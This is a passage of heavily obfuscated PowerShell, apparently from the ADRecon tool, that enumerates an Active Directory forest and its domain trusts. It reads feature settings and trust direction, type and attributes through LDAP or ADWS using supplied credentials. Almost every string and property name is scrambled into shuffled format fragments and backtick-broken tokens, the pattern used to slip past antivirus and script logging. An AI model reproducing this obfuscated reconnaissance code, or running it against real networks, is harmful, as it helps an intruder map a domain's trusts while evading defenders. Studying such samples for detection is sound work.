                        $Obj = New-Object ("{1}{2}{0}"-f 'ct','PSOb','je')
                        $Obj | Add-Member -MemberType ("{0}{1}{2}"-f'Not','eProper','ty') -Name ("{1}{0}{2}"-f 'r','Catego','y') -Value ("{2}{3}{0}{1}" -f 'p','e','Ena','bled Sco')
                        $Obj | Add-Member -MemberType ("{3}{2}{0}{1}" -f'p','erty','otePro','N') -Name ("{0}{1}" -f'Val','ue') -Value $PrivilegedAccessManagement."E`NabLed`sc`Op`Es"[$i]
                        $ForestObj += $Obj
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType ("{0}{1}{2}" -f 'Note','Propert','y') -Name ("{1}{0}" -f 'ue','Val') -Value ("{0}{1}"-f 'Disable','d')
                    $ForestObj += $Obj
                }
                Remove-Variable ("{1}{4}{3}{0}{5}{2}" -f 'ilegedAccessM','P','agement','v','ri','an')
            }
            Else
            {
                $Obj | Add-Member -MemberType ("{3}{1}{0}{2}"-f'ro','eP','perty','Not') -Name ("{0}{1}"-f 'Valu','e') -Value ("{0}{2}{1}"-f 'Disa','d','ble')
                $ForestObj += $Obj
            }
            Remove-Variable ("{1}{0}{2}"-f's','ADFore','t')
        }
    }

    If ($Method -eq ("{0}{1}"-f 'L','DAP'))
    {
        If ($Credential -ne   $K49P::"eMp`TY")
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain."DiSTin`gU`i`SHedn`Ame")
            $DomainContext = New-Object ("{11}{13}{14}{12}{9}{4}{5}{1}{2}{7}{10}{6}{3}{8}{0}" -f 'ext','ti','veDir','ory','ervic','es.Ac','.Direct','ect','Cont','S','ory','Sys','ry','t','em.Directo')(("{1}{0}"-f 'in','Doma'),$($DomainFQDN),$($Credential."uSerN`AmE"),$($Credential.("{3}{0}{2}{1}{4}"-f'etNetwor','redenti','kC','G','al').Invoke()."pASS`WOrd"))
            Try
            {
                $ADDomain =  $ihYj8Z::("{0}{1}" -f 'GetD','omain').Invoke($DomainContext)
            }
            Catch
            {
                Write-Warning ("{1}{5}{4}{6}{7}{0}{3}{2}"-f'or getting Dom','[G','ontext','ain C','t-ADRFores','e','t] ','Err')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            Remove-Variable ("{3}{1}{0}{2}" -f'tex','inCon','t','Doma')

            $ForestContext = New-Object ("{1}{5}{9}{12}{10}{13}{7}{8}{2}{3}{4}{11}{6}{0}"-f't','Syst','ct','ory.D','ire','e','Contex','ctiv','eDire','m','DirectoryServ','ctory','.','ices.A')(("{1}{0}" -f 'orest','F'),$($ADDomain."fOR`Est"),$($Credential."us`erna`Me"),$($Credential.("{1}{2}{3}{4}{5}{0}"-f'l','GetNetwo','r','k','Credent','ia').Invoke()."P`A`sSwOrd"))
            Remove-Variable ("{2}{1}{0}"-f'in','ma','ADDo')
            Try
            {
                $ADForest =   $2go::("{0}{1}" -f 'Ge','tForest').Invoke($ForestContext)
            }
            Catch
            {
                Write-Warning ("{10}{4}{1}{9}{5}{12}{11}{7}{8}{3}{6}{0}{2}" -f 'n','DRF','text','Forest C','-A',']','o','tt','ing ','orest','[Get','r ge',' Erro')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            Remove-Variable ("{3}{4}{2}{0}{1}"-f'on','text','C','Fo','rest')

            
            Try
            {
                $SearchPath = ("{11}{7}{2}{12}{1}{10}{0}{4}{3}{9}{5}{8}{6}"-f 'rvice,C','ry S','=Direc','Wi','N=','dows','Services','N',' NT,CN=','n','e','C','to')
                $objSearchPath = New-Object ("{2}{5}{1}{6}{0}{4}{7}{3}"-f 'i','stem.Direct','S','Entry','ce','y','oryServ','s.Directory') "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.configurationNamingContext)", $Credential."uSe`RNA`mE",$Credential.("{1}{4}{0}{2}{3}"-f 'rkCre','GetN','de','ntial','etwo').Invoke()."p`AssWO`Rd"
                $objSearcherPath = New-Object ("{5}{9}{10}{0}{3}{7}{4}{6}{8}{1}{2}"-f'm','Sea','rcher','.Direct','ervi','Sys','ces.Direc','oryS','tory','t','e') $objSearchPath
                $objSearcherPath."fi`ltER"=("{0}{6}{4}{2}{3}{1}{5}"-f'(','rect','m','e=Di','a','ory Service)','n')
                $objSearcherResult = $objSearcherPath.("{1}{0}" -f'll','FindA').Invoke()
                $ADForestTombstoneLifetime = $objSearcherResult."PrOPe`R`TiES"."TOmB`S`TONeliFE`Time"
                Remove-Variable ("{1}{2}{0}" -f 'th','SearchP','a')
                $objSearchPath.("{0}{1}"-f 'Di','spose').Invoke()
                $objSearcherPath.("{2}{1}{0}"-f'pose','s','Di').Invoke()
                $objSearcherResult.("{0}{1}"-f 'Disp','ose').Invoke()
            }
            Catch
            {
                Write-Warning ("{9}{10}{6}{1}{7}{3}{13}{8}{2}{12}{5}{0}{11}{4}" -f'bstone Lif','rest','tr',' Error ','ime','ing Tom','Fo',']','e','[Get-A','DR','et','iev','r')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
            
            If (  (vARiAbLe  ("5e97"+"4")  ).vAlUe::("{0}{2}{1}" -f 'T','t32','oIn').Invoke($objDomainRootDSE."FOrE`sTfUncTio`Na`litY",10) -ge 6)
            {
                Try
                {
                    $SearchPath = ("{13}{17}{5}{19}{9}{20}{6}{11}{3}{4}{10}{16}{21}{12}{18}{1}{0}{15}{7}{14}{8}{2}"-f ',','ices','on','atures',',CN',' ','l ','nfi','i','re,CN=O','=Direct','Fe','N=','CN=Recy','gurat','CN=Co','ory Serv','cle Bin','Windows NT,CN=Serv','Featu','ptiona','ice,C')
                    $objSearchPath = New-Object ("{2}{4}{5}{10}{8}{0}{9}{1}{3}{6}{7}" -f 't','ySer','Sy','vices.DirectoryE','s','t','n','try','m.Direc','or','e') "LDAP://$($DomainController)/$($SearchPath),$($objDomain.distinguishedName)", $Credential."us`e`RnAme",$Credential.("{2}{1}{3}{0}" -f 'edential','etNetwork','G','Cr').Invoke()."PAS`SwO`Rd"
                    $objSearcherPath = New-Object ("{6}{1}{3}{0}{5}{2}{4}{7}"-f'o','stem.Dire','es.DirectorySear','ct','ch','ryServic','Sy','er') $objSearchPath
                    $ADRecycleBin = $objSearcherPath.("{1}{2}{0}"-f 'All','Fin','d').Invoke()
                    Remove-Variable ("{1}{2}{0}" -f'th','Sear','chPa')
                    $objSearchPath.("{0}{1}"-f'Disp','ose').Invoke()
                    $objSearcherPath.("{0}{2}{1}"-f'D','spose','i').Invoke()
                }
                Catch
                {
                    Write-Warning ("{4}{1}{6}{2}{0}{11}{12}{8}{5}{9}{10}{7}{3}"-f 's','t-AD','Fore','ture','[Ge','ing Recyc','R','ea','retriev','le Bi','n F','t]',' Error ')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
            }
            
            If ( (  LS  vARiABle:5e974).valuE::("{1}{0}"-f 'nt32','ToI').Invoke($objDomainRootDSE."F`OresTfunCTI`Ona`Li`TY",10) -ge 7)
            {
                Try
                {
                    $SearchPath = ("{30}{0}{1}{25}{4}{3}{21}{10}{26}{29}{7}{6}{28}{18}{16}{5}{35}{17}{13}{2}{14}{23}{24}{32}{27}{33}{15}{12}{20}{34}{9}{22}{11}{8}{31}{19}" -f'Pr','i','s,CN=Dir',' Access ','leged',' F','ture','ea',',CN=Services,CN=','ow','ge','NT','CN=W','re','ect',',','al','tu','n','ration','i','Mana','s ','o','ry ','vi','m','ervi',',CN=Optio','ent F','CN=','Configu','S','ce','nd','ea')
                    $objSearchPath = New-Object ("{4}{3}{2}{1}{0}{9}{8}{10}{7}{5}{6}" -f'ec','r','stem.Di','y','S','yE','ntry','r','ryServices.Direct','to','o') "LDAP://$($DomainController)/$($SearchPath),$($objDomain.distinguishedName)", $Credential."USERN`A`ME",$Credential.("{6}{2}{5}{4}{3}{0}{1}" -f'ti','al','etN','eden','r','etworkC','G').Invoke()."PAS`sWo`Rd"
                    $objSearcherPath = New-Object ("{6}{4}{7}{2}{5}{0}{8}{1}{3}"-f'yServic','ectorySear','ect','cher','ys','or','S','tem.Dir','es.Dir') $objSearchPath
                    $PrivilegedAccessManagement = $objSearcherPath.("{2}{1}{0}"-f 'll','dA','Fin').Invoke()
                    Remove-Variable ("{0}{2}{1}"-f'Sea','ath','rchP')
                    $objSearchPath.("{1}{0}"-f 'se','Dispo').Invoke()
                    $objSearcherPath.("{2}{0}{1}"-f 's','e','Dispo').Invoke()
                }
                Catch
                {
                    Write-Warning ("{8}{1}{3}{7}{9}{2}{0}{6}{10}{5}{4}"-f 'trieving Pri','Get-ADRFore','e','st] Er','ture','gement Fea','vileged Acc','ror','[',' r','ess Mana')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
            }
        }
        Else
        {
            $ADDomain =  $iHyj8z::("{3}{1}{0}{2}{4}" -f'r','u','rentD','GetC','omain').Invoke()
            $ADForest =  $2go::("{5}{3}{2}{1}{4}{0}" -f 'st','entF','rr','Cu','ore','Get').Invoke()

            
            $ADForestTombstoneLifetime = ([ADSI]"LDAP://CN=Directory Service,CN=Windows NT,CN=Services,$($objDomainRootDSE.configurationNamingContext) ")."tO`mBS`TonE`L`iFetiME"."v`ALUe"

            
            If ( $5e974::("{2}{0}{1}"-f 'n','t32','ToI').Invoke($objDomainRootDSE."for`est`Fu`NctiONAlI`Ty",10) -ge 6)
            {
                $ADRecycleBin = ([ADSI]"LDAP://CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,$($objDomain.distinguishedName) ")
            }
            
            If ( ( gEt-vARIaBle  5E974  ).vaLuE::("{1}{2}{0}"-f'2','ToInt','3').Invoke($objDomainRootDSE."FOrEs`TFun`C`TIOn`ALI`Ty",10) -ge 7)
            {
                $PrivilegedAccessManagement = ([ADSI]"LDAP://CN=Privileged Access Management Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,$($objDomain.distinguishedName) ")
            }
        }

        If ($ADForest)
        {
            $ForestObj = @()

            
            $FLAD = @{
	            0 = ("{2}{3}{1}{0}" -f'00','ws20','Win','do');
	            1 = ("{2}{3}{0}{1}"-f '/Inter','im','Window','s2003');
	            2 = ("{2}{1}{3}{0}" -f 's2003','o','Wind','w');
	            3 = ("{0}{1}{2}"-f 'Wind','ows200','8');
	            4 = ("{1}{3}{0}{4}{2}"-f'o','W','s2008R2','ind','w');
	            5 = ("{0}{1}{2}"-f'W','indows2','012');
	            6 = ("{1}{0}{2}{3}" -f'indow','W','s2','012R2');
                7 = ("{0}{2}{1}" -f'Windo','016','ws2')
            }
            $ForestMode = $FLAD[ ( vArIabLe ('5e9'+'74')).VALUE::("{1}{0}" -f'2','ToInt3').Invoke($objDomainRootDSE."foreS`Tf`UncTIO`NAli`Ty",10)] + ("{0}{1}" -f 'F','orest')
            Remove-Variable ("{0}{1}"-f'FL','AD')

            $ObjValues = @(("{0}{1}"-f 'Na','me'), $ADForest."na`Me", ("{3}{0}{1}{2}{4}" -f'a','l',' L','Function','evel'), $ForestMode, ("{5}{4}{0}{1}{3}{2}"-f 'Naming',' ','ter','Mas','in ','Doma'), $ADForest."N`AMInG`ROleOw`Ner", ("{2}{1}{0}{3}"-f'ema Ma','ch','S','ster'), $ADForest."schEMaR`OL`EO`Wn`ER", ("{0}{2}{1}"-f 'R','omain','ootD'), $ADForest."R`ootdOmA`IN", ("{0}{2}{1}"-f 'Domain Co','t','un'), $ADForest."dOMAI`Ns"."cOu`NT", ("{2}{0}{1}"-f'ite Co','unt','S'), $ADForest."S`ITes"."cOu`NT", ("{1}{3}{0}{2}" -f 'talog ','Global ','Count','Ca'), $ADForest."G`L`OBaLc`ATaLO`gS"."cou`NT")

            For ($i = 0; $i -lt $($ObjValues."C`OUNT"); $i++)
            {
                $Obj = New-Object ("{0}{1}{2}" -f 'PS','O','bject')
                $Obj | Add-Member -MemberType ("{1}{0}{2}"-f'rt','NotePrope','y') -Name ("{1}{0}" -f'ategory','C') -Value $ObjValues[$i]
                $Obj | Add-Member -MemberType ("{3}{0}{1}{2}"-f'eProp','er','ty','Not') -Name ("{0}{1}"-f 'Va','lue') -Value $ObjValues[$i+1]
                $i++
                $ForestObj += $Obj
            }
            Remove-Variable ("{0}{2}{1}"-f 'Fore','ode','stM')

            For($i=0; $i -lt $ADForest."doMa`I`NS"."C`OunT"; $i++)
            {
                $Obj = New-Object ("{2}{0}{1}"-f'b','ject','PSO')
                $Obj | Add-Member -MemberType ("{2}{0}{1}"-f 'oper','ty','NotePr') -Name ("{1}{0}" -f 'tegory','Ca') -Value ("{0}{1}" -f'Domai','n')
                $Obj | Add-Member -MemberType ("{1}{0}{2}"-f 'o','NotePr','perty') -Name ("{0}{1}" -f'Va','lue') -Value $ADForest."Do`mai`Ns"[$i]
                $ForestObj += $Obj
            }
            For($i=0; $i -lt $ADForest."s`iTes"."C`OuNT"; $i++)
            {
                $Obj = New-Object ("{1}{0}"-f 'ect','PSObj')
                $Obj | Add-Member -MemberType ("{3}{0}{2}{1}" -f'o','rty','tePrope','N') -Name ("{0}{1}"-f'Ca','tegory') -Value ("{0}{1}"-f'Si','te')
                $Obj | Add-Member -MemberType ("{3}{0}{2}{1}" -f'teP','y','ropert','No') -Name ("{1}{0}" -f'ue','Val') -Value $ADForest."s`iTes"[$i]
                $ForestObj += $Obj
            }
            For($i=0; $i -lt $ADForest."Gl`oBAl`cAtaloGS"."c`oUnt"; $i++)
            {
                $Obj = New-Object ("{0}{1}"-f'PSOb','ject')
                $Obj | Add-Member -MemberType ("{1}{2}{0}"-f 'erty','N','oteProp') -Name ("{0}{1}{2}" -f'Cate','gor','y') -Value ("{1}{2}{0}" -f'g','Glo','balCatalo')
                $Obj | Add-Member -MemberType ("{3}{1}{2}{0}" -f 'erty','oteP','rop','N') -Name ("{0}{1}" -f 'Va','lue') -Value $ADForest."g`lOBAlcata`L`O`gs"[$i]
                $ForestObj += $Obj
            }

            $Obj = New-Object ("{1}{0}{2}" -f 'bj','PSO','ect')
            $Obj | Add-Member -MemberType ("{2}{3}{0}{1}" -f't','y','N','oteProper') -Name ("{0}{1}"-f'Ca','tegory') -Value ("{0}{2}{1}{3}" -f'T','e ','ombston','Lifetime')
            If ($ADForestTombstoneLifetime)
            {
                $Obj | Add-Member -MemberType ("{0}{1}{3}{2}" -f'NotePr','op','ty','er') -Name ("{1}{0}" -f 'alue','V') -Value $ADForestTombstoneLifetime
                Remove-Variable ("{4}{1}{0}{2}{5}{3}{6}" -f 'o','stT','mb','oneLifetim','ADFore','st','e')
            }
            Else
            {
                $Obj | Add-Member -MemberType ("{0}{2}{3}{1}" -f 'NotePro','rty','p','e') -Name ("{1}{0}"-f'alue','V') -Value ("{2}{0}{1}{3}" -f't','rieve','Not Re','d')
            }
            $ForestObj += $Obj

            $Obj = New-Object ("{1}{0}{2}" -f'j','PSOb','ect')
            $Obj | Add-Member -MemberType ("{2}{1}{0}"-f 'ty','oper','NotePr') -Name ("{1}{0}" -f 'gory','Cate') -Value (("{6}{7}{2}{3}{4}{5}{0}{1}" -f' onwards',')',' Bin ','(2008 ','R','2','Re','cycle'))
            If ($ADRecycleBin)
            {
                If ($ADRecycleBin."pRo`p`E`RtIes".'msDS-EnabledFeatureBL'."COu`Nt" -gt 0)
                {
                    $Obj | Add-Member -MemberType ("{2}{3}{1}{0}" -f 'rty','ope','Note','Pr') -Name ("{0}{1}"-f'Val','ue') -Value ("{0}{1}"-f'Enable','d')
                    $ForestObj += $Obj
                    For($i=0; $i -lt $($ADRecycleBin."proPe`R`T`ies".'msDS-EnabledFeatureBL'."co`Unt"); $i++)
                    {
                        $Obj = New-Object ("{1}{0}{2}" -f 'bj','PSO','ect')
                        $Obj | Add-Member -MemberType ("{3}{1}{2}{0}" -f 'rty','rop','e','NoteP') -Name ("{0}{1}" -f 'Categ','ory') -Value ("{0}{1}{2}" -f'Enabled',' S','cope')
                        $Obj | Add-Member -MemberType ("{0}{1}{2}"-f'NotePrope','rt','y') -Name ("{1}{0}" -f'alue','V') -Value $ADRecycleBin."p`ROPEr`TIes".'msDS-EnabledFeatureBL'[$i]
                        $ForestObj += $Obj
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType ("{0}{3}{1}{2}" -f 'Note','opert','y','Pr') -Name ("{1}{0}" -f 'alue','V') -Value ("{1}{0}{2}"-f 'bl','Disa','ed')
                    $ForestObj += $Obj
                }
                Remove-Variable ("{2}{1}{0}{3}"-f'cle','Recy','AD','Bin')
            }
            Else
            {
                $Obj | Add-Member -MemberType ("{2}{3}{0}{1}" -f 'op','erty','Not','ePr') -Name ("{0}{1}"-f 'Va','lue') -Value ("{1}{0}"-f'd','Disable')
                $ForestObj += $Obj
            }

            $Obj = New-Object ("{0}{2}{1}" -f 'PS','t','Objec')
            $Obj | Add-Member -MemberType ("{0}{3}{2}{1}"-f 'NotePr','ty','r','ope') -Name ("{1}{0}{2}"-f'eg','Cat','ory') -Value ("{1}{2}{3}{5}{10}{12}{0}{4}{6}{11}{8}{7}{9}" -f'(20','Privile','g','ed A','1','c','6 ','s','rd',')','ces','onwa','s Management ')
            If ($PrivilegedAccessManagement)
            {
                If ($PrivilegedAccessManagement."pRoPErt`I`eS".'msDS-EnabledFeatureBL'."c`OUNt" -gt 0)
                {
                    $Obj | Add-Member -MemberType ("{2}{1}{0}" -f'y','tePropert','No') -Name ("{1}{0}" -f 'ue','Val') -Value ("{0}{2}{1}"-f 'Ena','led','b')
                    $ForestObj += $Obj
                    For($i=0; $i -lt $($PrivilegedAccessManagement."p`RopE`RtIeS".'msDS-EnabledFeatureBL'."COU`Nt"); $i++)
                    {
                        $Obj = New-Object ("{0}{1}" -f'PS','Object')
                        $Obj | Add-Member -MemberType ("{2}{1}{0}{3}"-f 't','r','NotePrope','y') -Name ("{0}{2}{1}"-f'C','egory','at') -Value ("{0}{1}{2}"-f 'E','nabled Scop','e')
                        $Obj | Add-Member -MemberType ("{3}{1}{0}{2}" -f 'tePr','o','operty','N') -Name ("{1}{0}"-f'ue','Val') -Value $PrivilegedAccessManagement."PRoPe`Rti`Es".'msDS-EnabledFeatureBL'[$i]
                        $ForestObj += $Obj
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType ("{1}{0}{2}" -f'tePrope','No','rty') -Name ("{0}{1}"-f 'V','alue') -Value ("{2}{0}{1}"-f'isa','bled','D')
                    $ForestObj += $Obj
                }
                Remove-Variable ("{3}{5}{1}{7}{4}{2}{6}{0}" -f'ent','dA','anag','Privi','essM','lege','em','cc')
            }
            Else
            {
                $Obj | Add-Member -MemberType ("{0}{2}{1}"-f 'Not','erty','eProp') -Name ("{0}{1}" -f 'V','alue') -Value ("{1}{2}{0}"-f'bled','Di','sa')
                $ForestObj += $Obj
            }

            Remove-Variable ("{1}{0}{2}"-f'ore','ADF','st')
        }
    }

    If ($ForestObj)
    {
        Return $ForestObj
    }
    Else
    {
        Return $null
    }
}

Function G`ET-ADr`TRU`ST
{

    param(
        [Parameter(MANdAtoRY = $true)]
        [string] $Method,

        [Parameter(mandAtorY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain
    )

    
    $TDAD = @{
        0 = ("{2}{0}{1}"-f 'ab','led','Dis');
        1 = ("{1}{0}"-f'd','Inboun');
        2 = ("{2}{0}{1}" -f'tbou','nd','Ou');
        3 = ("{0}{1}{3}{2}" -f'BiDi','rec','l','tiona');
    }

    
    $TTAD = @{
        1 = ("{2}{1}{0}"-f'level','n','Dow');
        2 = ("{1}{0}" -f'level','Up');
        3 = "MIT";
        4 = "DCE";
    }

    If ($Method -eq ("{1}{0}" -f 'WS','AD'))
    {
        Try
        {
            $ADTrusts = Get-ADObject -LDAPFilter ("{1}{2}{4}{5}{6}{0}{3}" -f'ustedDomai','(object','Cla','n)','ss','=t','r') -Properties ("{2}{1}{0}{3}"-f 'tinguished','s','Di','Name'),("{0}{3}{2}{1}"-f 't','ner','art','rustP'),("{3}{1}{2}{4}{0}"-f 'ection','s','t','tru','dir'),("{1}{2}{0}" -f'type','trus','t'),("{3}{1}{2}{0}"-f 'ributes','s','tAtt','Tru'),("{2}{3}{1}{0}"-f'ted','a','w','henCre'),("{0}{1}{3}{2}" -f 'whenCh','a','ed','ng')
        }
        Catch
        {
            Write-Warning ("{7}{9}{0}{1}{2}{6}{5}{8}{3}{4}{10}{11}" -f 'us','t] Error wh','il','tedDoma','in Obje',' enumerating tru','e','[Get-A','s','DRTr','ct','s')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADTrusts)
        {
            Write-Verbose "[*] Total Trusts: $([ADRecon.ADWSClass]::ObjectCount($ADTrusts)) "
            
            $ADTrustObj = @()
            $ADTrusts | ForEach-Object {
                
                $Obj = New-Object ("{0}{2}{1}"-f'PSO','ject','b')
                $Obj | Add-Member -MemberType ("{0}{3}{1}{2}"-f'N','eProper','ty','ot') -Name ("{0}{2}{3}{1}"-f'Sou','main','rce',' Do') -Value (Get-DNtoFQDN $_."DisTi`N`guIs`hEDnAme")
                $Obj | Add-Member -MemberType ("{0}{2}{1}" -f 'Not','perty','ePro') -Name ("{2}{0}{3}{1}"-f 'rg','n','Ta','et Domai') -Value $_."TrU`ST`p`ARTnEr"
                $TrustDirection = [string] $TDAD[$_."trUS`Td`IReCTIoN"]
                $Obj | Add-Member -MemberType ("{1}{3}{0}{2}"-f'pert','N','y','otePro') -Name ("{1}{2}{0}{3}"-f 're','Trust D','i','ction') -Value $TrustDirection
                $TrustType = [string] $TTAD[$_."tRu`STt`yPE"]
                $Obj | Add-Member -MemberType ("{2}{1}{0}" -f'rty','Prope','Note') -Name ("{0}{1}{2}"-f 'T','rust ','Type') -Value $TrustType

                $TrustAttributes = $null
                If ([int32] $_."trUsT`A`TtRiBU`Tes" -band 0x00000001) { $TrustAttributes += ("{1}{2}{3}{0}{4}"-f'ti','N','on Tran','si','ve,') }
                If ([int32] $_."TR`UstA`T`TRiButES" -band 0x00000002) { $TrustAttributes += ("{0}{1}{2}"-f'UpL','eve','l,') }
                If ([int32] $_."TrusTAt`TR`Ibut`es" -band 0x00000004) { $TrustAttributes += ("{2}{0}{1}" -f'ntine','d,','Quara') } 
                If ([int32] $_."Tr`U`stATtriB`U`TeS" -band 0x00000008) { $TrustAttributes += ("{1}{5}{4}{3}{0}{2}"-f'iti','Fores','ve,','ns','Tra','t ') }
                If ([int32] $_."TRUSta`TT`RiBut`es" -band 0x00000010) { $TrustAttributes += ("{3}{1}{5}{0}{4}{2}" -f 'an','os','ation,','Cr','iz','s Org') } 
                If ([int32] $_."truStaTTRI`BUt`es" -band 0x00000020) { $TrustAttributes += ("{0}{1}{3}{4}{2}"-f 'Wit','hi','est,','n ','For') }
                If ([int32] $_."TRu`st`Attri`BUtES" -band 0x00000040) { $TrustAttributes += ("{1}{3}{2}{0}" -f'al,','Treat as ','xtern','E') }
                If ([int32] $_."TRU`S`TA`Ttr`ibUTEs" -band 0x00000080) { $TrustAttributes += ("{1}{2}{3}{0}"-f 'ion,','Uses RC4 E','ncry','pt') }
                If ([int32] $_."t`RusTAtTrI`B`UT`eS" -band 0x00000200) { $TrustAttributes += ("{2}{1}{0}{3}" -f'Dele',' TGT ','No','gation,') }
                If ([int32] $_."TRu`sta`TTrIBu`TEs" -band 0x00000400) { $TrustAttributes += ("{0}{1}{2}{3}" -f'PI','M ','Trus','t,') }
                If ($TrustAttributes)
                {
                    $TrustAttributes = $TrustAttributes.("{0}{2}{1}"-f 'T','imEnd','r').Invoke(",")
                }
                $Obj | Add-Member -MemberType ("{0}{1}{3}{2}"-f 'N','o','roperty','teP') -Name ("{2}{1}{0}"-f 's','tribute','At') -Value $TrustAttributes
                $Obj | Add-Member -MemberType ("{0}{3}{1}{2}"-f'NotePro','r','ty','pe') -Name ("{1}{2}{0}"-f'ated','w','henCre') -Value ([DateTime] $($_."WHeNC`REa`T`ed"))
                $Obj | Add-Member -MemberType ("{1}{2}{0}"-f 'erty','NoteP','rop') -Name ("{2}{1}{0}" -f 'd','ange','whenCh') -Value ([DateTime] $($_."WHeNc`hAn`gED"))
                $ADTrustObj += $Obj
            }
            Remove-Variable ("{1}{2}{0}" -f 's','ADT','rust')
        }
    }

    If ($Method -eq ("{1}{0}"-f'AP','LD'))
    {
        $objSearcher = New-Object ("{11}{8}{9}{5}{6}{7}{3}{2}{0}{4}{10}{1}{12}"-f'Dire','rch','s.','ice','ctor','.Dire','ctor','yServ','ys','tem','ySea','S','er') $objDomain
        $ObjSearcher."P`AGEs`iZe" = $PageSize
        $ObjSearcher."F`ilT`ER" = ("{2}{0}{1}{4}{3}" -f'Class=','trust','(object','main)','edDo')
        $ObjSearcher."pr`o`Pe`RTIEst`OLoad".("{2}{1}{0}" -f'ge','dRan','Ad').Invoke((("{2}{1}{0}{3}{5}{4}"-f 'ngui','ti','dis','s','ame','hedn'),("{2}{1}{0}" -f'r','rustpartne','t'),("{0}{2}{3}{1}{4}"-f 't','re','r','ustdi','ction'),("{1}{2}{0}"-f 'ttype','t','rus'),("{2}{4}{3}{1}{0}"-f'es','ut','tru','b','stattri'),("{0}{2}{1}" -f 'w','d','hencreate'),("{1}{2}{0}" -f 'ed','w','henchang')))
        $ObjSearcher."sEa`R`CHSCopE" = ("{1}{0}{2}" -f 'ubtr','S','ee')

        Try
        {
            $ADTrusts = $ObjSearcher.("{1}{0}" -f 'dAll','Fin').Invoke()
        }
        Catch
        {
            Write-Warning ("{4}{3}{10}{9}{7}{6}{0}{1}{5}{2}{8}" -f 'ile enumeratin','g tr','omai','et-AD','[G','ustedD','wh','r ','n Objects','o','RTrust] Err')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{0}{1}{2}" -f 'dispo','s','e').Invoke()

        If ($ADTrusts)
        {
            Write-Verbose "[*] Total Trusts: $([ADRecon.LDAPClass]::ObjectCount($ADTrusts)) "
            
            $ADTrustObj = @()
            $ADTrusts | ForEach-Object {
                
                $Obj = New-Object ("{2}{1}{0}" -f 'ect','SObj','P')
                $Obj | Add-Member -MemberType ("{1}{2}{3}{0}"-f 'y','NoteProp','er','t') -Name ("{2}{0}{1}" -f 'urce D','omain','So') -Value $(Get-DNtoFQDN ([string] $_."PRo`p`ErTI`Es"."distIng`Ui`SHe`dNAme"))
                $Obj | Add-Member -MemberType ("{1}{0}{2}"-f 'opert','NotePr','y') -Name ("{3}{4}{2}{1}{0}"-f 'n','ai','m','Target',' Do') -Value $([string] $_."Pro`p`erT`IeS"."tRuSTpAr`T`Ner")
                $TrustDirection = [string] $TDAD[$_."pR`Op`Er`TiEs"."trust`DIREC`T`iOn"]
                $Obj | Add-Member -MemberType ("{2}{3}{1}{0}"-f'erty','eProp','N','ot') -Name ("{1}{4}{3}{2}{0}"-f'n','T','ctio','Dire','rust ') -Value $TrustDirection
                $TrustType = [string] $TTAD[$_."P`ROPe`RTIes"."t`Ru`STTyPe"]
                $Obj | Add-Member -MemberType ("{2}{0}{1}{3}" -f'op','e','NotePr','rty') -Name ("{0}{2}{1}" -f 'Tr','ype','ust T') -Value $TrustType

                $TrustAttributes = $null
                If ([int32] $_."p`ROpER`TI`eS"."TRusTattRIB`U`T`ES"[0] -band 0x00000001) { $TrustAttributes += ("{1}{2}{0}{3}"-f'ansit','Non',' Tr','ive,') }
                If ([int32] $_."PROPER`T`IES"."TrUstA`T`Tr`IbutEs"[0] -band 0x00000002) { $TrustAttributes += ("{2}{1}{0}" -f'l,','eve','UpL') }
                If ([int32] $_."pR`OPeRT`Ies"."t`RuSTaTtR`I`BUTEs"[0] -band 0x00000004) { $TrustAttributes += ("{2}{1}{0}" -f'ntined,','a','Quar') } 
                If ([int32] $_."pro`pERT`IES"."tR`U`stAT`T`RiBUTEs"[0] -band 0x00000008) { $TrustAttributes += ("{1}{2}{3}{0}"-f ',','Fore','st Tran','sitive') }
                If ([int32] $_."PROP`Er`Ties"."T`RusT`ATtRiB`U`TEs"[0] -band 0x00000010) { $TrustAttributes += ("{4}{1}{2}{0}{5}{3}" -f'rganiza','s ','O','n,','Cros','tio') } 
                If ([int32] $_."p`ROp`E`RtIes"."TRust`A`T`TRibUtes"[0] -band 0x00000020) { $TrustAttributes += ("{2}{1}{4}{0}{3}"-f ' ','thi','Wi','Forest,','n') }
                If ([int32] $_."PR`Ope`RtieS"."t`RU`STaTtriB`UtES"[0] -band 0x00000040) { $TrustAttributes += ("{4}{1}{0}{3}{2}"-f'ea','r','rnal,','t as Exte','T') }
                If ([int32] $_."P`Rope`RTIeS"."t`RUst`AT`TRib`UTEs"[0] -band 0x00000080) { $TrustAttributes += ("{4}{3}{0}{2}{1}"-f 'RC4 ','on,','Encrypti','ses ','U') }
                If ([int32] $_."PrOPE`R`T`ies"."TRuStattR`iB`U`TeS"[0] -band 0x00000200) { $TrustAttributes += ("{2}{3}{0}{1}" -f 'legati','on,','No TG','T De') }
                If ([int32] $_."PropE`RT`IES"."TRus`TAT`TrIB`Utes"[0] -band 0x00000400) { $TrustAttributes += ("{2}{1}{0}{3}" -f'ust',' Tr','PIM',',') }
                If ($TrustAttributes)
                {
                    $TrustAttributes = $TrustAttributes.("{2}{0}{1}" -f 'E','nd','Trim').Invoke(",")
                }
                $Obj | Add-Member -MemberType ("{2}{3}{0}{1}" -f't','y','Not','eProper') -Name ("{1}{3}{0}{2}" -f'te','Att','s','ribu') -Value $TrustAttributes
                $Obj | Add-Member -MemberType ("{1}{2}{0}"-f 'operty','N','otePr') -Name ("{3}{1}{2}{0}" -f'd','e','ate','whenCr') -Value ([DateTime] $($_."p`R`OpERTI`es"."whe`NcREAt`ED"))
